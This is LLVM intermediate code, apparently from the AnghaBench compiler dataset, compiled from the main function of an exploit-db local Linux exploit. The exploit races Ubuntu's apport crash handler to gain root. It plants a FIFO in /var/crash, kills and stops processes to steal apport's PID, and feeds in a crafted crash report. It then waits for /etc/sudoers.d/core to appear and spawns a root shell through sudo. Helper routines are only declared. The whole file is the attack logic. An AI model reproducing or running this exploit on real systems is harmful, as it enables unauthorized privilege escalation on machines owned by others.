; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_37088.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_37088.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.rlimit = type { i8*, i8* }
%struct.stat = type { i32 }

@RLIM_INFINITY = common dso_local global i8* null, align 8
@RLIMIT_CORE = common dso_local global i32 0, align 4
@report = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [31 x i8] c"/var/crash/_bin_sleep.%d.crash\00", align 1
@S_IFIFO = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [12 x i8] c"created %s\0A\00", align 1
@apport_pid = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [26 x i8] c"apport stopped, pid = %d\0A\00", align 1
@SIGSTOP = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [15 x i8] c"sleeping 2s..\0A\00", align 1
@.str.4 = private unnamed_addr constant [17 x i8] c"writing to fifo\0A\00", align 1
@O_WRONLY = common dso_local global i32 0, align 4
@crash_report = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [24 x i8] c"fifo written.. wait...\0A\00", align 1
@.str.6 = private unnamed_addr constant [45 x i8] c"waiting for /etc/sudoers.d/core to appear..\0A\00", align 1
@.str.7 = private unnamed_addr constant [20 x i8] c"/etc/sudoers.d/core\00", align 1
@.str.8 = private unnamed_addr constant [9 x i8] c"success\0A\00", align 1
@.str.9 = private unnamed_addr constant [32 x i8] c"sudo -- sh -c 'stty echo;sh -i'\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.rlimit, align 8
  %6 = alloca %struct.stat, align 4
  store i32 0, i32* %1, align 4
  %7 = load i8*, i8** @RLIM_INFINITY, align 8
  %8 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %5, i32 0, i32 1
  store i8* %7, i8** %8, align 8
  %9 = load i8*, i8** @RLIM_INFINITY, align 8
  %10 = getelementptr inbounds %struct.rlimit, %struct.rlimit* %5, i32 0, i32 0
  store i8* %9, i8** %10, align 8
  %11 = load i32, i32* @RLIMIT_CORE, align 4
  %12 = call i32 @setrlimit(i32 %11, %struct.rlimit* %5)
  %13 = call i32 (...) @fork()
  store i32 %13, i32* %2, align 4
  %14 = load i32, i32* %2, align 4
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %18

16:                                               ; preds = %0
  %17 = call i32 (...) @crasher()
  br label %18

18:                                               ; preds = %16, %0
  %19 = load i8*, i8** @report, align 8
  %20 = call i32 (...) @getuid()
  %21 = call i32 @sprintf(i8* %19, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str, i64 0, i64 0), i32 %20)
  %22 = load i8*, i8** @report, align 8
  %23 = call i32 @unlink(i8* %22)
  %24 = load i8*, i8** @report, align 8
  %25 = load i32, i32* @S_IFIFO, align 4
  %26 = or i32 %25, 438
  %27 = call i32 @mknod(i8* %24, i32 %26, i32 0)
  %28 = load i32, i32* @stderr, align 4
  %29 = load i8*, i8** @report, align 8
  %30 = call i32 (i32, i8*, ...) @fprintf(i32 %28, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i8* %29)
  %31 = call i32 @usleep(i32 300000)
  %32 = load i32, i32* %2, align 4
  %33 = call i32 @kill(i32 %32, i32 11)
  %34 = load i32, i32* %2, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* @apport_pid, align 4
  %36 = load i32, i32* @stderr, align 4
  %37 = load i32, i32* @apport_pid, align 4
  %38 = call i32 (i32, i8*, ...) @fprintf(i32 %36, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i32 %37)
  %39 = call i32 @usleep(i32 300000)
  %40 = load i32, i32* %2, align 4
  %41 = call i32 @kill(i32 %40, i32 9)
  %42 = load i32, i32* %2, align 4
  %43 = call i32 @steal_pid(i32 %42)
  %44 = call i32 @sleep(i32 1)
  %45 = load i32, i32* @apport_pid, align 4
  %46 = load i32, i32* @SIGSTOP, align 4
  %47 = call i32 @kill(i32 %45, i32 %46)
  %48 = call i32 (...) @fork()
  store i32 %48, i32* %3, align 4
  %49 = load i32, i32* %3, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %54

51:                                               ; preds = %18
  %52 = call i32 (...) @checker()
  %53 = call i32 @exit(i32 0) #3
  unreachable

54:                                               ; preds = %18
  %55 = load i32, i32* @stderr, align 4
  %56 = call i32 (i32, i8*, ...) @fprintf(i32 %55, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  %57 = call i32 @sleep(i32 2)
  %58 = load i32, i32* @stderr, align 4
  %59 = call i32 (i32, i8*, ...) @fprintf(i32 %58, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0))
  %60 = load i8*, i8** @report, align 8
  %61 = load i32, i32* @O_WRONLY, align 4
  %62 = call i32 @open(i8* %60, i32 %61)
  store i32 %62, i32* %4, align 4
  %63 = load i32, i32* %4, align 4
  %64 = load i32, i32* @crash_report, align 4
  %65 = load i32, i32* @crash_report, align 4
  %66 = call i32 @strlen(i32 %65)
  %67 = call i32 @write(i32 %63, i32 %64, i32 %66)
  %68 = load i32, i32* %4, align 4
  %69 = call i32 @close(i32 %68)
  %70 = load i32, i32* @stderr, align 4
  %71 = call i32 (i32, i8*, ...) @fprintf(i32 %70, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0))
  %72 = load i32, i32* @stderr, align 4
  %73 = call i32 (i32, i8*, ...) @fprintf(i32 %72, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.6, i64 0, i64 0))
  br label %74

74:                                               ; preds = %54, %80
  %75 = call i32 @stat(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.7, i64 0, i64 0), %struct.stat* %6)
  %76 = getelementptr inbounds %struct.stat, %struct.stat* %6, i32 0, i32 0
  %77 = load i32, i32* %76, align 4
  %78 = icmp eq i32 %77, 37
  br i1 %78, label %79, label %80

79:                                               ; preds = %74
  br label %82

80:                                               ; preds = %74
  %81 = call i32 @usleep(i32 100000)
  br label %74

82:                                               ; preds = %79
  %83 = load i32, i32* @stderr, align 4
  %84 = call i32 (i32, i8*, ...) @fprintf(i32 %83, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.8, i64 0, i64 0))
  %85 = load i32, i32* %2, align 4
  %86 = call i32 @kill(i32 %85, i32 9)
  %87 = load i32, i32* %3, align 4
  %88 = call i32 @kill(i32 %87, i32 9)
  %89 = call i32 @system(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.9, i64 0, i64 0))
  ret i32 %89
}

declare dso_local i32 @setrlimit(i32, %struct.rlimit*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @crasher(...) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @getuid(...) #1

declare dso_local i32 @unlink(i8*) #1

declare dso_local i32 @mknod(i8*, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @steal_pid(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @checker(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @write(i32, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @stat(i8*, %struct.stat*) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
